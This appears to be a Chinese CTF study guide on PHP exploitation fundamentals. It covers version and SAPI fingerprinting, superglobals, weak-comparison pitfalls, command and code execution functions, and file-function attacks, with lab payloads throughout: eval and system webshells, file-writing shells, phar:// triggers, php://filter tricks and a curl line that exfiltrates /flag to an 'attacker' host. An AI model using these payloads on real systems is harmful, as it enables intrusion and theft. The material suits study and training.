## [g-php-basic] PHP 运行与语法——先搞懂环境与函数，后面所有洞都建立在这上面
### [php-env] PHP 运行环境与版本差异 | easy | PHP;环境;版本 | php -S;FPM;CLI
> PHP 四种运行方式与 5.x/7.x/8.x 关键差异，先判断靶机怎么跑 PHP

#### 这个条目的作用
同一段 PHP 代码，在 CLI、`php -S` 内置服务器、Apache mod_php、PHP-FPM 四种环境下行为不一样；同一套 exp，在 5.x 能打、在 7.2 哑火、在 8.0 直接报错。所以拿到靶机第一步不是找漏洞，而是回答两个问题：**它用什么版本跑 PHP？它用哪种方式跑 PHP？** 答案决定后面所有 payload 的选型。这条教你用黑盒手段在十分钟内把这两件事问出来。

#### 前置条件
- 一个可访问的 PHP 页面 URL（靶场首页 / index.php 都行）
- 浏览器开发者工具（F12 → Network 面板看响应头）

#### 第 1 步：看响应头拿 PHP 版本
操作：打开 F12 → Network → 刷新页面 → 点击第一个文档请求 → 看 Response Headers。
观察点：找这两个头——
```txt
X-Powered-By: PHP/7.4.33
Server: nginx/1.18.0
```
预期结果：`X-Powered-By` 直接给出精确版本号；`Server` 告诉你前置 Web 服务器是 nginx 还是 Apache。
如果不行：`X-Powered-By` 不出现，说明 php.ini 里 `expose_php=Off`，版本被隐藏，走第 2 步。

#### 第 2 步：用报错信息和特性差异反推版本
操作：故意触发错误看报错文案，再提交数组参数看警告。
命令/观察点：
```txt
http://target/index.php?x[]=1
```
行为：给期望字符串的参数提交数组，PHP 会报 `Array to string conversion` 警告，各版本错误文案风格不同（7.x 起带 `Uncaught Error` 类名、5.x 更朴素）。
预期结果：能大致区分 5 / 7 / 8 大版本。
如果不行：`display_errors=Off` 错误全被关，跳过，直接用第 5 步的差异表对着 payload 实测。

#### 第 3 步：判断 Web 服务器与 PHP 运行方式
操作：看 Server 头 + 试行为差异。
观察点：
- `Server: nginx` → 后面几乎必然是 **PHP-FPM**（或反向代理），`.htaccess` 对它无效。
- `Server: Apache/2.x` → 可能是 **mod_php**，`.htaccess` 可能生效。
- 访问一个不存在的 `.php` 路径，404 页面风格 nginx 与 Apache 不同。
预期结果：能说出「Nginx + PHP-FPM」还是「Apache」。
如果不行：Server 头被改/隐藏，跳到第 4 步用探针确认。

#### 第 4 步：探针文件 / phpinfo 一击定音
操作：当你有写文件能力（文件上传题、可写目录）时，上传内容为 `<?php phpinfo(); ?>` 的文件并直接访问；若应用自带 `?phpinfo=1` 调试开关就直接传这个参数。
命令/payload：
```php
<?php phpinfo(); ?>
```
预期结果：phpinfo() 页面给出全部答案——`PHP Version`、`Server API`（CLI Server / Apache 2.0 Handler / FPM/FastCGI）、`disable_functions`、`allow_url_include`、`Loaded Configuration File`。
如果不行：上传被后缀校验拦，改用 LFI + `php://filter` 读源码和配置（见 php-wrappers-adv 条目）；完全没有写文件能力就退回第 3 步的黑盒判断。

#### 第 5 步：对着版本差异表选 payload
操作：把拿到的版本号放进下表，看哪些老姿势还能用：
```txt
PHP < 5.5   preg_replace /e 修饰符可用
PHP 5.x     assert("code") 字符串执行默认可用；create_function 可用
PHP 7.0     preg_replace /e 被移除（再用直接致命错误）
PHP 7.2     assert 字符串执行被弃用（默认不执行）；create_function 弃用；each() 弃用
PHP 8.0     assert 字符串执行移除；create_function / each() 移除
PHP 8.1     $GLOBALS 变为只读快照，$GLOBALS['x']=... 直接赋值报错
```
预期结果：老 exp 打不动时，第一反应是「版本淘汰」，改走 eval 系入口、call_user_func 动态调用，或换该版本对应 CVE。
如果不行：仍然判断不了版本，就用「同一 payload 两种写法哪个生效」做二分实测（同时试 assert 马和 eval 马）。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| X-Powered-By 不显示 | php.ini `expose_php=Off` | 用报错页文案、phpinfo 探针、数组警告等特性反推 |
| 老 assert payload 不执行 | 靶机 PHP >= 7.2 | 换 eval / call_user_func；先确认版本再选链 |
| 上传的 .htaccess 没作用 | 运行方式是 Nginx+FPM 或 php -S | .htaccess 是 Apache 专属，换其他 getshell 路线 |
| php -S 靶机一请求就卡住 | 内置服务器单线程，前一个请求阻塞 | 别并发打；确认路由脚本是否把静态资源也吞了 |

#### 实战要点
- 版本信息决定一切选型：先拿版本再选 payload，别盲打。
- php -S 内置服务器不解析 .htaccess、单线程，遇到「并发就卡」先怀疑它。
- Nginx+FPM 下「哪些后缀交给 PHP」由 location 配置决定，配置不当的旧站有解析差异可利用（经典：`/a.jpg/x.php` 触发 cgi.fix_pathinfo 解析漏洞）。
- `X-Powered-By` 与报错页是零成本信息源，先看再说。
- phpinfo 页面 = 靶机配置全家桶（版本/SAPI/禁用函数/伪协议开关），有写文件能力时优先造一个。
- 本地复现永远用与靶机相同的大版本（7.x 的 exp 拿到 8.x 必翻车）。

### [php-syntax] 超全局变量与高频函数速查 | easy | PHP;语法;速查 | 超全局;$_GET
> 审计与写 payload 时最常用的 PHP 语法要素表

#### 这个条目的作用
审计 PHP 代码时，90% 的漏洞入口都是超全局变量；写 payload 时，一半的翻车来自 PHP 语法的坑（弱比较、`===`、大小写）。这条给一张「读代码 + 写 payload 随身带」的速查表：每个超全局变量数据来自哪里、同名 key 谁覆盖谁、高频函数有哪些反直觉行为。

#### 前置条件
- 能大致读懂 `<?php ... ?>` 代码
- 知道「参数 = 用户输入」这个概念

#### 第 1 步：背下六个超全局变量的数据来源
操作：读代码时遇到 `$_GET['x']`，先问自己「这个数据用户怎么控制」。对照表：
```txt
$_GET      URL 查询串      ?name=admin&age=18
$_POST     HTTP 请求体     form 表单键值，或 application/json（看解析配置）
$_REQUEST  $_GET + $_POST + $_COOKIE 的合并（默认 GP，POST 覆盖 GET）
$_COOKIE   请求头 Cookie 里的键值对
$_SERVER   HTTP 头（HTTP_*）、REMOTE_ADDR、REQUEST_URI、QUERY_STRING 等
$_FILES    上传文件（结构见第 3 步）
```
预期结果：审计时能说出「这个变量来自查询串 / 请求体 / Cookie / 头」。
如果不行：看到 `$_REQUEST` 不确定优先级，看第 2 步。

#### 第 2 步：搞懂 $_REQUEST 的同名覆盖顺序
操作：读 php.ini 的两个指令（靶场通常默认）：
```ini
variables_order = "EGPCS"   ; 决定 $_REQUEST 的组成与顺序
request_order   = "GP"      ; 若设置，优先于 variables_order 决定 $_REQUEST
```
规则：**靠后的覆盖靠前的**。默认 `GP` 下 GET 先入、POST 后入，所以 `GET ?x=a` + `POST x=b` 同时给时，`$_REQUEST['x']` 取 `b`。
预期结果：遇到「$_REQUEST 拿到的值和 URL 里不一样」能想到是 POST 覆盖了 GET。
如果不行：想精确验证就在本地跑 `php -r 'var_dump($_REQUEST);'` 或建个临时测试页，发两种请求对比。

#### 第 3 步：记牢 $_FILES 上传结构
操作：审计上传功能时按这个结构读：
```txt
$_FILES['upload']['name']     原始文件名（用户可控，可能带 ../ 或 .php）
$_FILES['upload']['type']     MIME 类型（客户端给的，可伪造）
$_FILES['upload']['tmp_name'] 服务端临时文件路径（PHP 自动生成，可被 LFI 包含）
$_FILES['upload']['size']     大小（字节）
$_FILES['upload']['error']    错误码（0 为成功）
```
预期结果：看到 `move_uploaded_file($_FILES['x']['tmp_name'], $dst)` 能立刻反应「原始文件名可控 → 后缀/路径校验是唯一防线」。
如果不行：先本地写个表单页上传一张图，`var_dump($_FILES)` 打印结构对照。

#### 第 4 步：背高频函数的反直觉行为（审计防漏）
操作：grep 代码时看到这些函数，多看一眼比较方式：
```php
strpos($s, $needle)        // 找不到返回 false，找到位置 0 也是 falsey —— 必须用 === false 判断
in_array($v, [1,2,3])      // 默认弱比较：in_array("1abc", [1]) 为 true
intval("1abc")             // 1；intval("abc") 是 0
strcmp($a, $b)             // 老绕过：传数组返回 NULL(falsy)；PHP 8 直接 TypeError
md5($s)                    // 弱比较 md5("240610708")==md5("QNKCDZO") 都是 0e... 相等
==   vs   ===              // == 弱比较会做类型转换；=== 严格比较
```
预期结果：审计登录/校验代码时能标出「这里是弱比较，可以绕过」。
如果不行：把上面每行在本地 `php -r` 跑一遍，亲眼确认再上靶场。

#### 第 5 步：记牢语法两个大小写规则
操作：写 payload 时注意——
- **变量名大小写敏感**：`$GET`、`$_get` 都不是 `$_GET`，用错拿不到值。
- **函数名大小写不敏感**：`System()`、`SYSTEM()` 与 `system()` 等价——常用于过「只匹配小写 system」的黑名单。
命令/payload：
```php
SyStEm($_GET['c']);   // 黑名单只查小写 system 时可绕过
```
预期结果：payload 里可以放心写函数名变形（前提是黑名单只查小写）。
如果不行：函数变形被拦说明是正则黑名单，参考 waf-bypass-techniques 换编码/拼接思路。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| $_REQUEST 拿不到预期值 | 同名参数被覆盖 | 默认 GP：POST 覆盖 GET；看 request_order / variables_order |
| strpos 判断「找到了」却不进分支 | 用 `if(strpos(...))` 而命中位置是 0 | 改成 `!== false` 判断 |
| 传数组参数老绕过失效 | 目标 PHP 8 对数组参数直接 TypeError | 确认版本；8.x 下 strcmp/strlen 数组绕过不可用 |
| 参数名带大写拿不到 | 变量名大小写敏感 | 对照代码里的精确写法，payload 参数名逐字符一致 |

#### 实战要点
- 审计入口三步：找到超全局变量 → 追它的过滤 → 追到 sink；入口表就是上面第 1 步那张。
- `$_SERVER['HTTP_*']`（HTTP_HOST、HTTP_USER_AGENT、HTTP_REFERER 等）全部由请求头决定，攻击者随意伪造，别信。
- `$_SERVER['REMOTE_ADDR']` 来自 TCP 连接，无法用 X-Forwarded-For 头伪造（那是 HTTP_X_FORWARDED_FOR）。
- 函数名不敏感 + 变量名敏感，是过简单黑名单的免费杠杆。
- 弱比较 `==` 是 PHP 审计第一大坑：in_array、strcmp、md5 0e、intval 都是高频考点。

### [php-rce-fns] 命令执行与代码执行函数全集 | medium | PHP;RCE;危险函数 | system;exec;eval
> system/exec/eval 全家桶：写法、回显、区别一次讲清

#### 这个条目的作用
RCE 类题目一半的翻车不是「打不进去」，而是「打进去了拿不到输出」。命令执行和代码执行是两条完全不同的路：命令执行走系统 shell（system/exec/shell_exec/passthru/popen/反引号），代码执行走 PHP 解释器（eval/assert/call_user_func）。这条把每个函数的精确写法、回显行为、能不能拿输出一次讲清，审计时一眼定位、利用时不抓瞎。

#### 前置条件
- 能看懂 `system($_GET['c'])` 这类函数调用
- 已了解 $_GET/$_POST（见 php-syntax 条目）

#### 第 1 步：system()——有回显的命令执行
操作/payload：
```php
system("id");
// 参数化入口：?c=id 配 system($_GET['c'])
```
行为：把命令输出**直接打到响应里**，同时返回最后一行字符串。
预期结果：页面直接显示 `uid=33(www-data)...`。
如果不行：页面空白 → 命令被过滤或函数被 disable_functions 禁用，换第 6/7 步的判定流程。

#### 第 2 步：exec()——默认只拿最后一行
操作/payload：
```php
echo exec("id");          // 只输出最后一行
exec("id", $output);      // 第二参数接收全部输出到数组 $output
print_r($output);
```
行为：不自动输出；无第二参数时返回值是输出的**最后一行**。
预期结果：对比 system 能看出「exec 没 echo 就啥都看不见」。
如果不行：只看到一行 → 不是漏洞，是 exec 的特性；换 system/shell_exec 或补第二参数。

#### 第 3 步：shell_exec() 与反引号——完整输出字符串
操作/payload：
```php
echo shell_exec("id");
echo `id`;                  // 反引号是 shell_exec 的语法糖
$r = shell_exec("cat /flag");
```
行为：返回**完整输出字符串**，不自动输出，要自己 echo。
预期结果：拿到完整多行输出，适合读文件、列目录。
如果不行：返回 null → 命令执行失败（路径问题/被禁）或函数被禁，换 passthru 试。

#### 第 4 步：passthru() 与 popen()/proc_open()——二进制与管道
操作/payload：
```php
passthru("cat /flag.jpg");            // 原始二进制直接输出（图片/二进制场景）
$p = popen("ls /tmp", "r");           // 打开管道，返回句柄
echo fread($p, 4096);
pclose($p);
```
行为：passthru 输出原始数据不转义；popen 返回管道句柄可流式读；proc_open 更底层可同时控制 stdin/stdout/stderr。
预期结果：需要读图片/二进制 flag 用 passthru；需要流式/交互用管道族。
如果不行：这两类最容易被 disable_functions 禁，被禁就回到第 7 步判定。

#### 第 5 步：eval() 与 assert()——代码执行
操作/payload：
```php
eval('echo 1+1;');                 // 执行 PHP 语句，无返回值，echo 直接输出
eval($_POST['c']);                 // 典型 webshell：POST c=system('id');
assert("phpinfo()");               // PHP < 7.2 可用字符串执行；8.0 起不执行
```
行为：eval 执行**PHP 代码**（不是 shell 命令）；里面的 echo 直接输出。assert 的字符串执行是历史特性（7.2 弃用、8.0 移除）。
预期结果：`?c=system('id');` 走 eval 入口也能拿到命令输出（eval 里调用 system）。
如果不行：eval 被 disable_functions 拦或 assert 不执行 → 版本问题，见 php-eval-vs-system 条目。

#### 第 6 步：call_user_func 系与间接调用——动态函数名
操作/payload：
```php
call_user_func('system', 'id');       // 动态调用任意函数
call_user_func_array('system', ['id']);
$_GET['f']($_GET['a']);               // 变量函数：f=system&a=id
array_map('system', ['id']);          // 高阶函数里塞危险回调
```
行为：把「函数名」当字符串传入再被调用，等于任意函数调用点。
预期结果：遇到 `call_user_func($_GET['f'], ...)` 直接构造 `f=system&...`（注意 eval 是语言结构，不能这么调）。
如果不行：白名单限制了函数名 → 找名单里能间接执行的可达点（如 unserialize 打反序列化、文件写马）。

#### 第 7 步：判定「有没有回显」再决定打法
操作：把上面六类函数按「能否拿输出」分组：
```txt
直接回显：   system / passthru / eval 里 echo
拿返回值：   shell_exec / 反引号（完整串）、exec 第二参数（数组）
半回显：     exec（最后一行）、system（已直接输出）
管道流式：   popen / proc_open
无回显：     exec 单参数且没人 echo
```
预期结果：payload 打进去没输出时，先判断「是不是这个函数的特性」，别急着换洞。
如果不行：确实无回显 → 用 `curl http://attacker/$(cat /flag)` 外带（出网时），或写文件再读。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| exec 打进去没输出 | exec 默认只返回最后一行且不 echo | 换 system/shell_exec，或 `exec($c,$out)` 拿数组 |
| 命令执行成功但页面空白 | 输出被吞 / 函数无回显 | 确认函数族；外带或写文件回显 |
| eval 里写 system 没反应 | eval 被禁 / 引号转义问题 | 用双引号拼、分号结尾；确认 disable_functions |
| 反引号包的命令没执行 | 反引号写在字符串内部只是普通字符 | 用 shell_exec 显式调用，或把反引号写在字符串外 |
| system 被禁 | disable_functions | 见 php-disable-functions 条目（LD_PRELOAD/FFI/FPM） |

#### 实战要点
- 先分清「命令执行」还是「代码执行」：前者 payload 是 shell 命令（id、cat /flag），后者 payload 是 PHP 代码（system('id');）。
- 有回显 > 无回显：优先找 system/passthru/shell_exec，最后才考虑外带。
- eval 是语言结构不是函数：不能 `call_user_func('eval',...)`、不能 `$f='eval';$f()`。
- create_function 的代码字符串可含引号，写 payload 时注意参数转义（7.2 弃用、8.0 移除）。
- 禁用名单看 phpinfo 的 disable_functions 行，哪个在名单外走哪条路。

### [php-file-ops] 文件操作危险函数与利用点 | medium | PHP;文件;危险函数 | include;file_get_contents
> include/unlink/file_put_contents 等在 CTF 里的利用姿势

#### 这个条目的作用
文件函数是 PHP 题的第二大入口：读（file_get_contents/file/readfile）、写（file_put_contents/fwrite）、包含（include/require）、删改（unlink/rename）。同一个函数，「参数可控」是一种打法（直接读 flag/写马），「参数不可控」又有另一种打法（伪协议、过滤器、phar 触发）。这条把每个函数的两面都讲清。

#### 前置条件
- 了解 PHP 基本文件函数（见 php-syntax 条目）
- 知道 `$_GET`/`$_POST` 参数入口

#### 第 1 步：include / require 系——LFI 的入口
操作/代码：
```php
include($_GET['file']);     // 文件不存在：Warning，脚本继续跑
require($_GET['file']);     // 文件不存在：Fatal，脚本直接停
include_once / require_once // 同前，但同文件只包含一次
```
行为：把文件内容**当 PHP 代码执行**（若含 `<?php`）或原样输出（纯文本）。
预期结果：`?file=/etc/passwd` 能读到系统文件（LFI 成立）；`?file=flag.php` 输出里 PHP 代码已执行，看不到源码。
如果不行：读不到 → 看 include 路径拼接（`include("pages/".$_GET['file'])` 需要 `../` 穿越）；想看源码用第 2 步的 php://filter。

#### 第 2 步：file_get_contents / file / readfile——读文件三兄弟
操作/代码：
```php
echo file_get_contents('/flag');    // 读成字符串
$lines = file('/etc/passwd');       // 读成数组，每行一个元素
readfile('/flag');                  // 直接输出，无需 echo
```
行为：file_get_contents 返回字符串；file 返回数组；readfile 边读边输出。
预期结果：`?f=php://filter/convert.base64-encode/resource=flag.php` 用 filter 读源码防执行（base64 出来自己解码）。
如果不行：被过滤/路径限制 → 用伪协议组合（php://filter 链、data://、php://input，见 php-wrappers-adv 条目）。

#### 第 3 步：file_put_contents / fwrite——写马的两种姿势
操作/代码：
```php
file_put_contents($_GET['f'], $_GET['c']);   // 直接写：f=shell.php&c=<?php system($_GET['cmd']);?>
file_put_contents("shell.php", "<?php eval(\$_POST['c']);?>", FILE_APPEND);  // 追加模式
$fp = fopen('shell.php', 'w'); fwrite($fp, '<?php ...?>'); fclose($fp);
```
行为：把字符串写进文件；fopen 的 w 覆盖、a 追加、x 独占新建。
预期结果：写出的 shell.php 能被直接访问并执行（如果 Web 目录可写且后缀解析）。
如果不行：内容被过滤（`<?php` 被吞）→ 用过滤器写：`php://filter/write=convert.base64-decode/resource=shell.php`，请求体只放 base64（base64_decode 会忽略非 base64 字符，见 php-wrappers-adv）。

#### 第 4 步：unlink / rename——删改与文件竞争
操作/代码：
```php
unlink($_GET['f']);        // 删除文件（任意文件删除）
rename("a.php", "b.jpg");  // 重命名（改名绕过后缀校验）
rename("x.jpg", "x.php");  // 图片内容改成 .php 后缀 → 内容含 PHP 代码即可执行
```
行为：unlink 删文件；rename 移动/改名。
预期结果：上传题里「上传 .jpg 但内容可控」→ 找 rename 到 .php 的点 getshell；或 unlink 删任意文件（删 install.lock 重装后台）。
如果不行：目标路径被拼接死 → 用 `../` 穿越或绝对路径绕过。

#### 第 5 步：用 phar:// 把文件操作变成反序列化触发点
操作/payload：
```php
file_exists("phar://uploads/a.jpg/test.txt");   // 低可疑触发点
is_file("phar://uploads/a.jpg/test.txt");
include("phar://uploads/a.jpg/test.txt");
```
行为：任何文件函数以 `phar://` 访问 phar 文件时，其 metadata 会被反序列化——**代码里没有 unserialize 也能打**。
预期结果：上传带恶意 metadata 的 phar（改后缀 .jpg），在 unlink/rename/file_exists 等点触发 POP 链。
如果不行：PHP >= 8.0 默认不再自动反序列化 phar metadata（8.0 安全加固），老打法失效 → 换触发点/绕过，细节见 php-phar-deser 条目。

#### 第 6 步：判定「这个文件函数能不能打」
操作：按参数可控性分类：
```txt
参数 = 用户输入（直接拼接）    → 直接打：读/写/包含/删除
参数 = 固定路径               → 找伪协议 / 过滤器 / phar 触发
内容可控、路径固定            → 写内容到固定文件（覆盖配置、日志包含）
路径可控、内容固定            → 读固定文件 / include 固定文件打 LFI
```
预期结果：拿到任何文件函数调用点都能说出「走哪条利用路线」。
如果不行：哪条都走不通 → 回到源码看有没有二次传递（先存变量再拼接），参考 php-audit-checklist。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| include 了 .php 看不到源码 | 内容被当代码执行了 | 用 php://filter/convert.base64-encode 读源码 |
| include 非 PHP 文件不执行 | 内容没有 `<?php` 标记 | 需要解析漏洞/伪协议配合（见 php-wrappers-adv） |
| 写的 shell 访问是空白/源码 | 目录不可执行/后缀不解析 | 换可写可解析目录；FPM 下确认 location 规则 |
| 内容里 `<?php` 被过滤 | 关键字黑名单 | 过滤器写 base64、短标签 `<?=`、大小写/编码绕过 |
| phar 不触发 | PHP >= 8.0 默认不反序列化 metadata | 换版本思路 / 配合 phar 反序列化绕过 trick |

#### 实战要点
- include 是 LFI 起点、file_put_contents 是写马终点、unlink/rename 常配合 phar 与文件竞争。
- 读不到源码就 base64：`php://filter/convert.base64-encode/resource=` 是万能第一步。
- rename 把图片改 .php 是经典 getshell；内容必须含 `<?php` 才执行。
- unlink/rename 在「上传临时文件」场景常用于触发 phar 反序列化或文件竞争（先探测后并发）。
- 每个文件函数先问：参数可控吗？内容可控吗？路径可控吗？三选一就有路。

### [php-eval-vs-system] eval / assert / preg_replace /e 区别与 PHP8 变化 | easy | PHP;eval;assert | 代码执行;PHP8
> 三兄弟的归属、弃用时间线与替代方案

#### 这个条目的作用
「代码执行」和「命令执行」是两条路，很多人混着写 payload 然后翻车。eval 执行 PHP 代码，system 执行系统命令——但 eval 里可以调用 system，所以两者经常串联。这条把 eval / assert / preg_replace /e / create_function 的归属、弃用时间线、以及 PHP 8 下的替代方案一次讲清：老靶场的 exp 拿到新靶场必挂，挂在哪、怎么换，是这条的核心。

#### 前置条件
- 上一条 php-rce-fns 的基础（知道 system/exec/eval 基本用法）

#### 第 1 步：分清代码执行与命令执行
对照：
```txt
代码执行（PHP 解释器）   eval / assert(老) / create_function(老) / call_user_func 调危险函数
命令执行（系统 shell）    system / exec / shell_exec / passthru / popen / 反引号
桥梁                     eval 里写 system('id'); —— 代码执行包一层命令执行
```
预期结果：看到 `eval($_POST['c'])` 知道 POST 的是 PHP 代码；看到 `system($_GET['c'])` 知道 GET 的是 shell 命令。
如果不行：把两个入口各打一次 `?c=id` 和 `?c=system('id');`，看哪个响应有变化，反推类型。

#### 第 2 步：eval 的精确规则
操作/代码：
```php
eval('echo 1;');            // 执行语句；注意是分号结尾的语句，不是表达式
eval('return 1+1;');        // 有 return 才有返回值，否则返回 null
eval("system('id');");      // 串里调用命令执行函数
```
规则：eval 是语言结构；只能执行**语句**（`echo 1;` 可以，裸 `1+1` 不行）；无 return 时返回 null；eval 不是函数，不能 `call_user_func('eval',...)`。
预期结果：写马时用 `eval($_POST['c']);`，POST 体带分号结尾的 PHP 代码。
如果不行：eval 被 disable_functions 禁 → 找 assert（老版本）或 call_user_func 等替代入口。

#### 第 3 步：assert 的兴衰时间线
时间线：
```txt
PHP 5.x   assert("phpinfo();") 字符串会被当代码执行 —— 经典马
PHP 7.2   字符串执行被弃用（E_DEPRECATED），默认不再执行
PHP 8.0   字符串参数彻底不执行，只按「非空字符串 = true」做真值判断
```
预期结果：老 assert 马在 8.0 靶场「不报错但没反应」——字符串被当成 true 了。
如果不行：确认版本后换 eval / call_user_func 入口，别在 assert 上耗。

#### 第 4 步：preg_replace /e 与 create_function 的现状
对照：
```txt
preg_replace("/x/e", "code", $s)   5.5 弃用，7.0 移除；7.0+ 再用直接 Fatal
                                   替代：preg_replace_callback
create_function('$a','return $a;') 7.2 弃用，8.0 移除；8.0 调用报未定义函数
                                   替代：匿名函数 function($a){...} / fn($a)=>...
each()                             7.2 弃用，8.0 移除；替代：foreach
```
预期结果：老题解里的 `/e` 链、create_function 链在 7.0+/8.0 靶场全部失效，能立刻识别「版本淘汰」。
如果不行：确认版本后改用 `preg_replace_callback` 思路重新审计 sink，或换 eval 类入口。

#### 第 5 步：写 payload 前的版本自查清单
操作：动手前按这个清单过一遍（版本获取见 php-env 条目）：
```txt
□ PHP >= 8.0 ？  → assert 字符串执行没了、create_function 没了、each 没了
□ PHP >= 7.0 ？  → preg_replace /e 没了（用就 Fatal）
□ PHP >= 7.2 ？  → assert 字符串执行默认关
□ PHP >= 8.1 ？  → $GLOBALS 只读快照，别用 $GLOBALS['x']= 赋值
□ 有无 disable_functions ？ → 决定 eval 里的 system 能不能跑
```
预期结果：任何老 exp 失效时，第一反应是「版本/配置淘汰」而不是「打不进去」。
如果不行：版本拿不到就用双写探测（assert 马 + eval 马都放，看哪个活）。

#### 第 6 步：按版本选替代方案
替代路线：
```txt
assert("code") 挂了    → eval("code") / call_user_func('system','id') / 变量函数 $f($a)
create_function 挂了   → 匿名函数（审计侧要看有没有别的调用点）
/e 修饰符挂了         → 找 preg_replace_callback 或换 eval 类入口
eval 也被禁           → 反序列化 POP 链 / 文件写马 / 打 FPM（见对应条目）
```
预期结果：手里永远有一条「当前版本可用」的代码执行路线。
如果不行：全被禁 → 说明是 disable_functions 硬壳，转 php-disable-functions 条目四条主流路线。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| assert 的 payload 不执行也不报错 | PHP >= 8.0：字符串当 true | 换 eval / call_user_func；确认版本 |
| eval 里写 `1+1` 没输出 | eval 只执行语句，表达式需 return | 写成 `echo 1+1;` 或 `return 1+1;` 再 echo |
| preg_replace 带 /e 直接 500 | PHP >= 7.0 已移除该修饰符 | 换 preg_replace_callback |
| create_function 报未定义函数 | PHP 8.0 已移除 | 换匿名函数/闭包或找其他 sink |
| system 在 eval 里被拦 | disable_functions | 转 disable_functions 绕过条目 |

#### 实战要点
- 版本自查永远在写 payload 之前：老 exp 在新靶场失效 90% 是版本淘汰。
- PHP 8 里 eval 仍然可用，只是更容易被 disable_functions 盯上；eval 是语言结构，不能被动态调用。
- 三个「已死」的代码执行点记住时间线：/e（7.0 死）、assert 字符串（7.2 废 8.0 死）、create_function（8.0 死）。
- 命令执行 vs 代码执行：打进去没反应先看类型，别拿 shell 命令直接喂 eval（eval 里要包 system()）。
- 看到 call_user_func / 变量函数 `$f($a)` 优先考虑：它们跨版本稳定，不依赖已移除特性。
